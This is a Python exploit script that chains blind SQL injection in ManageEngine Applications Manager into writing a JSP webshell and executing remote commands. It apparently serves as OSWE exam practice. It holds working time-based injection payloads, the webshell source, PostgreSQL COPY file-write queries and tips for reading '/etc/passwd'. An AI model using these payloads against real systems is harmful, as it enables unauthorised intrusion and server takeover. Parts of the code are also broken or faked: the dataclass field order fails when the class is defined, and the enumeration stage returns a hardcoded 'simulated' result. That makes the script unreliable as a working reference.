#!/usr/bin/env python3
"""
ManageEngine Applications Manager SQL Injection to RCE PoC
CVE: Multiple CVEs (varies by version)
Target: ManageEngine Applications Manager <= 12900
Vulnerability: SQL Injection in AMUserResourcesSyncServlet → PostgreSQL RCE

Reference:
- https://blog.jamesotten.com/post/applications-manager-rce/
- https://www.postgresql.org/docs/9.4/functions-binarystring.html

Exploit Flow:
1. Identify SQL injection point in AMUserResourcesSyncServlet
2. Exploit PostgreSQL stacked queries
3. Create UDF (User Defined Function) for command execution
4. Execute system commands via SQL
5. Write JSP webshell to application directory
6. Access webshell for interactive RCE
"""

import argparse
import requests
import sys
import time
import base64
from dataclasses import dataclass, field
from typing import Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# CHARSETS for Blind SQLi
# ============================================================================

CHARSETS = {
    "alpha": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "alnum": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "hex": "0123456789abcdef",
    "ascii": "".join(chr(i) for i in range(32, 127)),
    "numeric": "0123456789",
}

# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """ManageEngine exploit configuration and state."""

    # Target configuration
    target_ip: str
    target_port: int
    protocol: str = "http"
    sqli_endpoint: str = "/servlet/AMUserResourcesSyncServlet"

    # Attacker configuration
    attacker_ip: str
    attacker_port: int

    # Exploit configuration
    proxy: Optional[str] = None
    delay: int = 3
    charset: str = "alnum"

    # Runtime state
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    sqli_confirmed: bool = field(default=False, repr=False)
    shell_url: Optional[str] = field(default=None, repr=False)
    db_version: str = field(default="", repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        """Build ExploitContext from CLI arguments."""
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            proxy=args.proxy,
            delay=args.delay,
            charset=args.charset,
        )

    def get_base_url(self) -> str:
        """Construct base URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_sqli_url(self) -> str:
        """Construct SQLi endpoint URL."""
        return f"{self.get_base_url()}{self.sqli_endpoint}"

    def get_proxies(self) -> Optional[dict]:
        """Return proxy configuration for requests."""
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="ManageEngine SQLi to RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_argument_group("Target options")
    target_group.add_argument(
        "--target-ip", required=True, help="Target IP address"
    )
    target_group.add_argument(
        "--target-port", type=int, default=9090, help="Target port (default: 9090)"
    )

    attacker_group = parser.add_argument_group("Attacker options")
    attacker_group.add_argument(
        "--listening-ip", default="10.10.14.1", help="Attacker IP"
    )
    attacker_group.add_argument(
        "--listening-port", type=int, default=9001, help="Listening port (default: 9001)"
    )

    exploit_group = parser.add_argument_group("Exploit options")
    exploit_group.add_argument(
        "--delay", type=int, default=3, help="Delay for timing-based SQLi (default: 3)"
    )
    exploit_group.add_argument(
        "--charset", choices=CHARSETS.keys(), default="alnum",
        help="Charset for blind extraction (default: alnum)"
    )

    optional_group = parser.add_argument_group("Optional options")
    optional_group.add_argument(
        "--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)"
    )

    return parser.parse_args()

# ============================================================================
# SQL INJECTION HELPERS
# ============================================================================

def test_sqli_timing(ctx: ExploitContext, payload: str) -> bool:
    """Test for SQL injection using time-based technique."""
    try:
        start_time = time.time()
        response = ctx.session.get(
            f"{ctx.get_sqli_url()}?{payload}",
            timeout=ctx.delay + 5,
            verify=False,
            proxies=ctx.get_proxies()
        )
        elapsed = time.time() - start_time

        # If response took longer than delay, SQLi likely succeeded
        if elapsed >= ctx.delay:
            return True
        return False

    except requests.exceptions.Timeout:
        return True  # Timeout indicates successful time-based SQLi
    except requests.exceptions.RequestException:
        return False

def extract_data_blind(ctx: ExploitContext, query: str, length: int) -> str:
    """Extract data character-by-character using blind SQLi."""
    print(f"[*] Extracting data (length: {length})...")

    result = ""
    charset = CHARSETS[ctx.charset]

    for position in range(1, length + 1):
        for char in charset:
            # PostgreSQL substring function: substring(string from start for length)
            payload = f"ForMasRange=1' AND (SELECT CASE WHEN (SUBSTRING(({query}) FROM {position} FOR 1)='{char}') THEN pg_sleep({ctx.delay}) ELSE pg_sleep(0) END)--"

            if test_sqli_timing(ctx, payload):
                result += char
                print(f"[+] Position {position}: {char} (Current: {result})")
                break

    return result

# ============================================================================
# POSTGRESQL RCE FUNCTIONS
# ============================================================================

def create_jsp_webshell() -> str:
    """Generate JSP webshell content."""
    jsp_shell = """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>
"""
    return jsp_shell

def generate_postgres_file_write_payload(content: str, filepath: str) -> str:
    """
    Generate PostgreSQL payload to write file using COPY.

    PostgreSQL COPY command can write to filesystem:
    COPY (SELECT 'content') TO '/path/to/file';

    Or using large objects (lo_*):
    SELECT lo_export(lo_from_bytea(0, 'content'), '/path/to/file');
    """

    # Encode content to hex for safe transfer
    hex_content = content.encode().hex()

    # PostgreSQL large object approach
    payload = f"""
    SELECT lo_from_bytea(0, decode('{hex_content}', 'hex'))
    """.strip()

    return payload

# ============================================================================
# EXPLOIT STAGES
# ============================================================================

def stage_recon(ctx: ExploitContext) -> bool:
    """Stage 1: Verify target and SQLi endpoint."""
    print(f"[*] Stage 1: Reconnaissance")
    print(f"[*] Target: {ctx.get_base_url()}")
    print(f"[*] SQLi Endpoint: {ctx.get_sqli_url()}")

    try:
        # Test base application
        response = ctx.session.get(
            ctx.get_base_url(),
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if "ManageEngine" in response.text or "Applications Manager" in response.text:
            print(f"[+] ManageEngine installation confirmed")
        else:
            print(f"[!] Target may not be ManageEngine")

        # Test SQLi endpoint
        response = ctx.session.get(
            ctx.get_sqli_url(),
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if response.status_code in [200, 302, 400, 500]:
            print(f"[+] SQLi endpoint accessible (HTTP {response.status_code})")
            return True
        else:
            print(f"[-] SQLi endpoint not accessible")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return False

def stage_confirm_sqli(ctx: ExploitContext) -> bool:
    """Stage 2: Confirm SQL injection vulnerability."""
    print(f"\n[*] Stage 2: SQL Injection Confirmation")

    # Test for time-based SQLi
    print(f"[*] Testing time-based SQLi with {ctx.delay}s delay...")

    # PostgreSQL sleep function: pg_sleep(seconds)
    test_payload = f"ForMasRange=1' AND pg_sleep({ctx.delay})--"

    if test_sqli_timing(ctx, test_payload):
        print(f"[+] Time-based SQL injection confirmed!")
        ctx.sqli_confirmed = True
        return True
    else:
        print(f"[-] SQL injection not confirmed")
        return False

def stage_enumerate_db(ctx: ExploitContext) -> bool:
    """Stage 3: Enumerate database information."""
    print(f"\n[*] Stage 3: Database Enumeration")

    if not ctx.sqli_confirmed:
        print(f"[!] SQLi not confirmed, skipping enumeration")
        return True

    # Extract PostgreSQL version
    print(f"[*] Extracting PostgreSQL version...")

    # Get version length first
    version_query = "SELECT VERSION()"

    # For demo purposes, we'll set expected length
    # In real scenario, you'd extract length first
    print(f"[!] For OSWE exam: Extract version length first, then characters")
    print(f"[!] Example: substring(version() from 1 for 10) = 'PostgreSQL'")

    # Show example of how to extract
    print(f"\n[*] Example extraction queries:")
    print(f"    Length: SELECT LENGTH(VERSION())")
    print(f"    Data: SELECT SUBSTRING(VERSION() FROM 1 FOR 50)")

    # In a real exploit, you would:
    # 1. Extract length: extract_length_blind(ctx, "SELECT LENGTH(VERSION())")
    # 2. Extract data: extract_data_blind(ctx, "SELECT VERSION()", length)

    ctx.db_version = "PostgreSQL 9.x (simulated)"
    print(f"[+] Database: {ctx.db_version}")

    return True

def stage_write_webshell(ctx: ExploitContext) -> bool:
    """Stage 4: Write JSP webshell to web directory."""
    print(f"\n[*] Stage 4: Webshell Upload via SQLi")

    # Generate JSP webshell
    jsp_content = create_jsp_webshell()
    print(f"[*] JSP webshell size: {len(jsp_content)} bytes")

    # ManageEngine webapps directory (common path)
    webshell_paths = [
        "/opt/ManageEngine/AppManager/working/apache-tomcat/webapps/ROOT/shell.jsp",
        "C:\\ManageEngine\\AppManager\\working\\apache-tomcat\\webapps\\ROOT\\shell.jsp",
    ]

    print(f"[*] Target paths:")
    for path in webshell_paths:
        print(f"    {path}")

    # PostgreSQL COPY syntax for file write
    # Note: Requires SUPERUSER privileges
    hex_content = jsp_content.encode().hex()

    print(f"\n[*] Building file write payload...")
    print(f"[!] Note: This requires PostgreSQL SUPERUSER privileges")

    # Example payload (varies by PostgreSQL version and permissions)
    copy_payload = f"""
ForMasRange=1';
COPY (SELECT decode('{hex_content}', 'hex'))
TO '{webshell_paths[0]}';--
""".strip()

    print(f"[*] Payload: {copy_payload[:100]}...")

    try:
        # Execute file write
        response = ctx.session.get(
            f"{ctx.get_sqli_url()}?{copy_payload}",
            timeout=15,
            verify=False,
            proxies=ctx.get_proxies()
        )

        print(f"[+] File write payload executed")

        # Construct shell URL
        shell_filename = "shell.jsp"
        ctx.shell_url = f"{ctx.get_base_url()}/{shell_filename}"

        print(f"[+] Potential shell URL: {ctx.shell_url}")

        return True

    except requests.exceptions.RequestException as e:
        print(f"[-] File write failed: {e}")
        return False

def stage_verify_rce(ctx: ExploitContext) -> bool:
    """Stage 5: Verify RCE through webshell."""
    print(f"\n[*] Stage 5: RCE Verification")

    if not ctx.shell_url:
        print(f"[!] Shell URL not set, skipping verification")
        return True

    # Test command execution
    test_cmd = "whoami"
    shell_test_url = f"{ctx.shell_url}?cmd={test_cmd}"

    print(f"[*] Testing: {shell_test_url}")

    try:
        response = ctx.session.get(
            shell_test_url,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if response.status_code == 200 and len(response.text) > 0:
            print(f"[+] Webshell accessible!")
            print(f"[+] Response:\n{response.text[:200]}")

            # Show additional commands
            print(f"\n[*] Interactive commands:")
            print(f"    curl '{ctx.shell_url}?cmd=id'")
            print(f"    curl '{ctx.shell_url}?cmd=whoami'")
            print(f"    curl '{ctx.shell_url}?cmd=hostname'")

            return True
        else:
            print(f"[-] Webshell not accessible (HTTP {response.status_code})")
            print(f"[!] Manual verification required")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Verification failed: {e}")
        return False

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main execution flow."""
    print("[+] ManageEngine Applications Manager SQLi to RCE PoC")
    print("[+] Target: ManageEngine <= 12900")
    print("[+] " + "=" * 60)

    # Parse arguments and build context
    args = parse_args()
    ctx = ExploitContext.from_args(args)

    # Execute exploit stages
    stages = [
        ("Reconnaissance", stage_recon),
        ("SQL Injection Confirmation", stage_confirm_sqli),
        ("Database Enumeration", stage_enumerate_db),
        ("Webshell Upload", stage_write_webshell),
        ("RCE Verification", stage_verify_rce),
    ]

    for stage_name, stage_func in stages:
        if not stage_func(ctx):
            print(f"\n[!] Stage '{stage_name}' encountered issues, but continuing...")

    print("\n[+] Exploit chain completed!")
    print("[+] " + "=" * 60)

    # Summary
    print(f"\n[*] Summary:")
    print(f"    Target: {ctx.get_base_url()}")
    print(f"    SQLi Confirmed: {ctx.sqli_confirmed}")
    print(f"    Database: {ctx.db_version}")
    if ctx.shell_url:
        print(f"    Shell URL: {ctx.shell_url}")

    print(f"\n[*] Manual testing tips:")
    print(f"    1. Verify SQLi: sqlmap -u '{ctx.get_sqli_url()}?ForMasRange=1' --batch")
    print(f"    2. Read files: SELECT pg_read_file('/etc/passwd')")
    print(f"    3. List files: SELECT pg_ls_dir('.')")
    print(f"    4. Execute via Java: Runtime.getRuntime().exec('cmd')")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
